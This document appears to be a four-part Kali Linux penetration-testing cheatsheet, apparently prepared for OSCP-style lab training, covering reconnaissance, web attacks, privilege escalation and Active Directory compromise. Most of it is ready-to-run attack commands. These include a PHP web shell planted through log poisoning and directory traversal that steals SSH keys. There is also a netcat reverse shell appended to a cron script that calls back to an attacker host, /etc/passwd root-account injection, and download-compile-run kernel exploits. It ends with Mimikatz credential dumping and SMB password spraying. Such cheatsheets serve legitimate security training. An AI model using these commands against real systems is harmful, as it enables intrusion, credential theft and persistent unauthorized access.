# Kali Linux: Terminal Setup, Commands, Enumeration, and Privilege Escalation Cheatsheet (Part 1 of 4)

## Kali Turbo Setup and Upgrade

```bash
sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys ED65462EC8D5E4C5
sudo apt update --allow-releaseinfo-change
sudo apt full-upgrade -y
```

> Tip: Keep canceling and retrying the upgrade if it stalls.

Download Kali VM:  
[https://www.kali.org/get-kali/#kali-virtual-machines](https://www.kali.org/get-kali/#kali-virtual-machines)

---

## General Linux Commands

```bash
touch filename.txt              # Create file
ls -l filename.txt             # List with perms
chmod +x filename.py           # Make executable
chmod -x filename.py           # Remove exec perms
which chmod                    # Find binary path
cp /usr/bin/ls chmodfix        # Copy binary to new name
cat /usr/bin/chmod > chmodfix  # Dump binary content
sudo                           # Invoke superuser
```

Execute script:
```bash
./filename.py
```

---

## Netcat and File Transfer

```bash
nc 192.168.50.220 4444                 # Connect via TCP
nc -l -p 4444 > enumscript             # Listener for file
cat /usr/bin/unix-privesc-check | nc 192.168.171.214 4444  # Send file
```

---

## Account and Sudo Handling

```bash
su - root                  # Switch to root
sudo -L                   # List sudo privs
sudo -i                   # Elevate shell to root
su account                # Switch to another user
history | grep keyword    # Search shell history
```

---

## Package Updates

```bash
sudo apt update
sudo apt upgrade -y
sudo apt full-upgrade -y
sudo apt autoremove -y
sudo reboot
```

Install Metasploit:
```bash
sudo apt update && sudo apt install metasploit-framework -y
```

---

## PostgreSQL Service Control

```bash
sudo systemctl status postgresql
sudo systemctl start postgresql
sudo systemctl stop postgresql
sudo systemctl enable postgresql
```

---

## Common File Tasks

```bash
sudo gunzip rockyou.txt.gz   # Unzip rockyou
pwd                          # Show working dir
```

---

## chmod Permission Reference

| Value | Binary | Meaning                 |
|-------|--------|-------------------------|
| 0     | 000    | No access               |
| 1     | 001    | Execute only            |
| 2     | 010    | Write only              |
| 3     | 011    | Write and execute       |
| 4     | 100    | Read only               |
| 5     | 101    | Read and execute        |
| 6     | 110    | Read and write          |
| 7     | 111    | Read, write, execute    |

Example:
```bash
chmod 720 file
```
> Owner: read/write/exec, Group: write only, Others: none

---

## Passive OSINT

- `whois example.com`
- Google Dorking (e.g., `site:target.com inurl:admin`)
- [Netcraft](https://www.netcraft.com/)
- GitHub code/secret hunting
  ```bash
  gitleaks -v -r=https://github.com/target/repo
  ```
- [Shodan](https://www.shodan.io/)
- [securityheaders.com](https://securityheaders.com)

---

## DNS Record Types

| Record | Purpose                                |
|--------|----------------------------------------|
| NS     | Name Server                            |
| A      | IPv4 Address                           |
| AAAA   | IPv6 Address                           |
| MX     | Mail Exchange                          |
| PTR    | Reverse DNS                            |
| CNAME  | Alias to another domain                |
| TXT    | Arbitrary text, SPF/DKIM validation    |

---

## Active Info Gathering (Linux)

```bash
host www.megacorpone.com
host -t mx megacorpone.com
host -t txt megacorpone.com
```

Subdomain brute force:
```bash
for ip in $(cat list.txt); do host $ip.megacorpone.com; done
```

Classic Ping Sweep pingsweep enumeration one liner 

```bash
bash -c 'for ip in 10.4.103.{1..254}; do ping -c1 -W1 $ip &>/dev/null && echo "$ip is up"; done'
```

Class C ping sweep:
```bash
for ip in $(seq 200 254); do host xx.xx.xx.$ip; done | grep -v "not found"
```
or in parallel
```bash
for ip in $(seq 1 254); do (ping -c1 -W1 192.168.1.$ip &>/dev/null && echo "10.4.103.$ip is up") & done; wait
```
nc port enumeration no nmap found

bash 
```
for port in {1..1000}; do (echo > /dev/tcp/10.10.10.10/$port) >/dev/null 2>&1 && echo "Port $port is open"; done

```


Tools:
```bash
dnsrecon -d megacorpone.com -t std
dnsrecon -d megacorpone.com -D ~/list.txt -t brt
dnsenum megacorpone.com
```

---

## Active Info Gathering (Windows)

```cmd
nslookup mail.megacorptwo.com
nslookup -type=TXT info.megacorptwo.com 192.168.50.151
```

Netcat scanning (TCP):
```bash
nc -nvv -w 1 -z 192.168.50.152 3388-3390
```

Netcat UDP:
```bash
nc -nv -u -z -w 1 192.168.50.149 120-123
```

Local mail server enum:
```bash
nc –nv 192.168.50.8 25
```

Windows enumeration:
```cmd
net view \\dc01 /all
Test-NetConnection –Port 25 192.168.50.8
Dism /online /enable-feature /featurename:TelnetClient
telnet 192.168.50.8 25
```

To be continued in **Part 2 of 4**...
# Kali Linux: Terminal Setup, Commands, Enumeration, and Privilege Escalation Cheatsheet (Part 2 of 4)

## Nmap Scanning

Basic:
```bash
nmap 192.168.50.149
nmap -p 1-65535 192.168.50.33
```

Scan types:
```bash
sudo nmap -sS 192.168.60.32      # Stealth
nmap -sT 192.168.50.131          # Full connect
sudo nmap -sU 192.168.50.149     # UDP
sudo nmap -sU -sS 192.168.50.149 # TCP + UDP
```

Ping sweep:
```bash
nmap -sn 192.168.50.1-253
nmap -v -sn 193.168.50.1-253 -oG ping-sweep.txt
grep Up ping-sweep.txt | cut -d " " -f 2
```

Top ports:
```bash
nmap -sT -A --top-ports=20 192.168.50.1-253 -oG top-port-sweep.txt
```

OS detection:
```bash
sudo nmap -O 192.168.50.14 --osscan-guess
```

Advanced:
```bash
nmap -sT -A 192.168.40.14
nmap -v -p 139,445 -oG smb.txt 192.168.50.1-254
```

Enumerate Nmap scripts:
```bash
ls -l /usr/share/nmap/scripts/smb*
nmap -v -p 139,445 --script smb-os-discovery 192.168.50.152
sudo nmap -sU --open -p 161 192.168.50.1-254 -oG open-snmp.txt
```

NSE vuln detection:
```bash
sudo nmap -sV -p 21,22,80,3306 --script "vuln" 192.168.127.112
```

Find NSE scripts:
```bash
ls /usr/share/nmap/scripts | grep http
nmap --script-help http-headers
nmap --script http-headers 192.168.50.6
```

Grepping NSE output:
```bash
sudo nmap --script http-title 192.168.191.1-153 | grep -A 5 -B 10 -i "construction"
```

---

## NetBIOS and SMB Enumeration

```bash
sudo nbtscan -r 192.168.50.0/24
```

---

## Windows Powershell Enumeration

```powershell
Test-NetConnection –Port 445 192.168.50.151
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2>$null
```

---

## SNMP Enumeration

```bash
sudo nmap -sU --open -p 161 192.168.50.1-254 -oG open-snmp.txt
echo public > community
echo private >> community
echo manager >> community
for ip in $(seq 1 254); do echo 192.168.50.$ip; done > ips
onesixtyone -c community -i ips
snmpwalk -c public -v1 -t 10 192.168.50.151
snmpwalk -c public -v1 192.168.50.151 1.3.6.1.4.1.77.1.2.25
```

---

## Vulnerability Scanning w/ Custom NSE

```bash
cd /usr/share/nmap/scripts
sudo nmap --script-updatedb
cat script.db | grep "\"vuln\""
sudo nmap -sV -p 443 --script "vuln" 192.168.50.124
```

---

## Web Enumeration

```bash
sudo nmap -p 80 -sV 192.168.50.20
sudo nmap -p 80 --script=http-enum 192.168.50.20
```

Tech fingerprinting:
- Wappalyzer (browser plugin)

---

## Gobuster

```bash
gobuster dir -u http://192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
```

---

## API Enumeration with curl

```bash
curl -I http://192.168.50.16:5002/users/v1
curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type:application/json' http://192.168.50.16:5002/users/v1/login
curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type:application/json' http://192.168.50.16:5002/users/v1/login
curl 'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth BIGASSTOKEN' \
  -d '{"password": "pwned"}'
```

---

## Directory Traversal

```bash
curl http://target.com/../../../../etc/passwd
curl http://target.com/cgi-bin/%2e%2e/etc/passwd
```

Stealing SSH key:
```bash
curl http://mountaindessers.com/meteor/index.php?page=../../../../home/offsec/.ssh/id_rsa
chmod 400 dt_key
ssh -i dt_key -p 2222 offsec@mountaindessers.com
```

---

## File Inclusion / Log Poisoning

Example injection:
```bash
echo '<?php system($_GET["cmd"]); ?>' > /var/log/apache2/access.log
curl http://target.com/index.php?page=/var/log/apache2/access.log&cmd=id
```

To be continued in **Part 3 of 4**...
# Kali Linux: Terminal Setup, Commands, Enumeration, and Privilege Escalation Cheatsheet (Part 3 of 4)

## Windows Privilege Escalation

### Basic Enumeration

```powershell
whoami /groups
whoami
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember Administrators
systeminfo
ipconfig /all
route print
netstat -ano
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select DisplayName
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select DisplayName
Get-Process
get-childitem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
get-childitem -Path C:\ -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
type c:\xampp\passwords.txt
net user hanep
runas /user:hanep cmd
Get-History
(Get-PSReadlineOption).HistorySavePath
```

### WinRM Access

```bash
evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123!!"
```

### File Hosting & Transfer

```bash
python3 -m http.server 80
nc -lvp 4444 > winpeas.exe
iwr -uri http://192.168.1.100/winpeasx64.exe -o winpeas.exe
```

### Credential Search

```powershell
Get-ChildItem -Path "C:\Users" -Filter *.txt -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
  if (Select-String -Path $_.FullName -Pattern "password" -CaseSensitive:$false -ErrorAction SilentlyContinue) {
    Write-Host "`nFile: $($_.FullName)" -ForegroundColor Green
    Get-Content $_.FullName -ErrorAction SilentlyContinue
    Write-Host "-----------------------------------"
  }
}
```

### Service Binary Hijacking

```powershell
Get-CimInstance -ClassName win32_service | Select Name, State, PathName
icacls "C:\Program Files\MyService\service.exe"
Move-Item C:\xampp\mysql.exe .
net stop mysql
Shutdown /r /t 0
```

PowerUp usage:
```powershell
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks
Get-ModifiableServiceFile
Install-ServiceBinary -Name "mysql"
```

### DLL Hijacking

Use `Procmon.exe` to detect where a binary loads DLLs from and drop a malicious one in a writable dir.

---

## Unquoted Service Path Exploitation

```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
icacls "C:\Program Files"
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

---

## Scheduled Task Hijack

```powershell
schtasks /query /fo LIST /v
icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
```

Hijack and replace target binary with payload.

---

## Potato Exploits (SeImpersonate Priv)

```bash
wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
.\SigmaPotato "net user dave4 lab /add"
.\SigmaPotato "net localgroup Administrators dave4 /add"
```

---

## Linux Privilege Escalation

### Basic Enumeration

```bash
ls -l /etc/shadow
id
cat /etc/passwd
hostname
cat /etc/issue
cat /etc/os-release
ps aux
ip a
route -n
netstat -an
ss -anp
cat /etc/iptables/rules.v4
ls -lah /etc/cron*
crontab -l
sudo crontab -l
dpkg -l
find / -perm -u=s -type f 2>/dev/null
strings /usr/bin/passwd | grep OS
```

### Storage & Mount Points

```bash
cat /etc/fstab
mount
lsblk
lsmod
/sbin/modinfo libata
```

### File Write Tests

```bash
find / -writable -type d 2>/dev/null
find / -perm -o+w -type f 2>/dev/null
```

---

## Shell and Env

```bash
env
cat ~/.bashrc
sudo grep -r "OS{" / 2>/dev/null
```

---

## Inspecting Services

```bash
watch -n 1 "ps -aux | grep pass"
sudo tcpdump -i lo -A | grep "pass"
```

---

## Cron Job Abuse

```bash
grep "CRON" /var/log/syslog
cat /home/joe/.scripts/user_backups.sh
ls -lah /home/joe/.scripts/user_backups.sh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.118.2 1234 >/tmp/f" >> user_backups.sh
nc -lnvp 1234
```

---

## Automated Linux PrivEsc

```bash
./unix-privesc-check standard > output.txt
crunch 6 6 -t Lab%%% > wordlist
hydra -l eve -P wordlist 192.168.50.214 -t 4 -v
```

---

## /etc/passwd Injection

```bash
openssl passwd w00t
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
```

---

## SUID Exploits

```bash
find / -perm -u=s -type f 2>/dev/null
ls -asl /usr/bin/passwd
ps u -C passwd
grep uid /proc/<PID>/status
```

Example shell:
```bash
find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
```

To be continued in **Part 4 of 4**...
# Kali Linux: Terminal Setup, Commands, Enumeration, and Privilege Escalation Cheatsheet (Part 4 of 4)

## Getcap Binary Exploits

```bash
getcap -r / 2>/dev/null
```

GTFOBins example:
```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

---

## Abusing Sudo Access

```bash
sudo -l                             # Check sudo perms
cat /var/log/syslog | grep tcpdump # Investigate failure
sudo apt-get changelog apt         # GTFOBins usage
```

---

## Kernel Exploits

Check system info:
```bash
cat /etc/issue && uname -r && arch
```

Search exploits:
```bash
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"
```

Filter results:
```bash
grep "4." | grep -v "< 4.4.0" | grep -v "4.8"
```

Compile locally:
```bash
cp /usr/share/exploitdb/exploits/linux/local/45010.c .
mv 45010.c cve-2017-16995.c
gcc cve-2017-16995.c -o cve-2017-16995
file cve-2017-16995
./cve-2017-16995
```

Other exploits:
```bash
wget https://www.exploit-db.com/download/45553 -O exploit.c && gcc exploit.c -o exploit -pthread && chmod +x exploit && ./exploit
wget https://www.exploit-db.com/download/1299 -O exploit.sh && chmod +x exploit.sh && ./exploit.sh
wget https://www.exploit-db.com/download/46362 -O exploit.py && python3 exploit.py && rm exploit.py
```

Fix Windows-style formatting:
```bash
sed -i 's/\r$//' exploit.sh
```

Check binary versions:
```bash
/usr/bin/sudo -V
dpkg -l | grep passwd
```

Dirty Cow style:
```bash
./exploit hacker /etc/passwd hacker:pwned:0:0:pwned:/root:/bin/bash
```

---

## LinPEAS and Exploit Suggesters

```bash
wget -O linpeas.sh https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

wget https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl
chmod +x linux-exploit-suggester-2.pl
./linux-exploit-suggester-2.pl

wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

---

## SSH Tunneling / Port Forwarding

```bash
ip route
ip addr
```

Pull creds from Confluence:
```bash
cat /var/atlassian/application-data/confluence/confluence.cfg.xml
```

SOCKS tunnel:
```bash
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
psql -h 192.168.50.63 -p 2345 -U postgres
```

Extract user data:
```sql
\c confluence
SELECT * FROM cwd_user;
```

Crack with hashcat:
```bash
hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt
```

SSH forward:
```bash
socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
```

---

## Metasploit Cheats

```bash
sudo msfdb init
sudo systemctl enable postgresql
sudo msfconsole
db_status
```

Using modules:
```bash
use <module>
info
show options
set RHOSTS <target>
run
```

Common tasks:
```bash
search type:auxiliary ssh
back
workspace -a exploits
db_nmap -A 192.168.50.202
search Apache 2.4.49
sessions -l
sessions -i 2
run -j
```

---

## Active Directory Exploitation (Manual)

```cmd
net user /domain
net user jeffadmin /domain
net group /domain
net group "Sales Department" /domain
```

---

## PowerView AD Enum

```powershell
Get-ObjectAcl -Identity stephanie
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
"SIDs..." | Convert-SidToName
net group "Management Department" stephanie /add /domain
Get-NetGroup "Management Department" | select member
net group "Management Department" stephanie /del /domain
```

---

## BloodHound / SharpHound Collection

```powershell
Import-Module .\Sharphound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"
```

Transfer:
```bash
nc -lnvp 4444 > SharpHoundOutput.zip
nc64.exe 192.168.45.249 4444 < "C:\Users\Stephanie\Desktop\corp audit_YYYYMMDD_BloodHound.zip"
```

Neo4j:
```bash
sudo apt update
sudo apt install neo4j
sudo neo4j start
```

---

## Mimikatz

```bash
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets
```

---

## Password Spray (via PowerShell)

```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://$PDC/DC=$($domainObj.Name.Replace('.', ',DC='))"
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
```

---

## CrackMapExec SMB Spray

```bash
crackmapexec smb 192.168.140.0-100 -u username.txt -p 'Nexus123!' -d corp.com --continue-on-success
```
